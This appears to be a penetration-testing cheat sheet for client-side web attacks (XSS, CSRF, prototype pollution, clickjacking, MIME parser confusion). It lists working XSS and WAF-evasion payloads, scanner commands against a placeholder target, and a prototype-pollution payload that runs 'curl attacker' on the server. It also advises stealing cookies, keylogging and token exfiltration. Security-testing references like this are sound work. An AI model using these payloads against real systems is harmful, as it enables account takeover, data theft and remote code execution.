## Client-Side Attacks (XSS, CSRF, Prototype Pollution, Clickjacking)

### XSS (Reflected / Stored / DOM)

- **[Primary Probe]** `dalfox url "https://target/search?q=FUZZ" --cookie "session=X" --blind https://<interactsh>` across all reflection points
  - **[Signal: Payload fires]** Escalate to ATO: exfiltrate cookies, forge requests, keylogger
  - **[Dead End: HTML entities encoded]** Test DOM XSS: grep JS for sinks (`document.write`, `innerHTML`, `eval`) and sources (`location.hash`, `referrer`, `postMessage`)
  - **[Dead End: CSP blocks inline]** CSP bypass via JSONP: `<script src="/api/callback?cb=alert(1)">` or trusted CDN whitelisted in CSP
  - **[Dead End: Strict CSP + nonce]** SVG upload: `<svg onload="alert(document.domain)"/>`

**WAF Evasion Patterns:**
- Tag: `<ScRiPt>`, `<img/src=x onerror=alert(1)>`
- Comment injection: `</script><script>ale/**/rt(1)</script>`
- Concatenation: `'ale'+'rt'+'(1)'`
- Template literals: `` alert`1` ``
- HTML5: `<details open ontoggle=alert(1)>`

### MIME / Signed-Content Parser Confusion

- **[Primary Probe]** When apps parse email/MIME in one component and verify signatures in another, diff interpretations
  - **[Signal: Header/body mismatch]** MIME boundary collision to render attacker HTML while preserving signature
  - **[Signal: QP/Base64 decode present]** Encode payload so parser-decoded HTML executes while filters miss raw source
  - **[Dead End: Shadow DOM used]** Script can still execute inside attached shadow trees
  - **[Data Chaining]** XSS in auth context → exfiltrate tokens → privileged API actions

### CSRF

- **[Primary Probe]** Remove `CSRF token` from state-changing requests; replay in cross-origin context
  - **[Signal: Action succeeds without token]** PoC: `<form method=POST target="_blank">`
  - **[Dead End: Token validated]** Test token-reuse; test tied to session but not action; test SameSite=Lax GET bypass
  - **[Dead End: SameSite=Strict]** Chain stored XSS to extract and replay CSRF token programmatically

### Prototype Pollution

- **[Primary Probe]** Burp DOM Invader or `ppmap -u "https://target"` for automated gadget discovery
  - **[Signal: `__proto__[canary]=1` reflected]** Search for gadgets: `innerHTML`, `eval`, `fetch`, `document.write` consuming polluted properties
  - **[Dead End: Client hardened]** Test server-side (Node.js): `{"__proto__":{"admin":true}}` in JSON or query params
  - **[Dead End: No client gadgets]** URL query: `?__proto__[outputFunctionName]=x;process.mainModule.require('child_process').exec('curl attacker')//`

### Clickjacking

- **[Primary Probe]** Check `X-Frame-Options` and `Content-Security-Policy: frame-ancestors`; iframe target in test page
  - **[Signal: Page frames]** UI overlay PoC targeting high-impact action (fund transfer, delete)
  - **[Dead End: `DENY` or `SAMEORIGIN`]** Test `object`/`embed` tags; check subdomains with looser policies

***
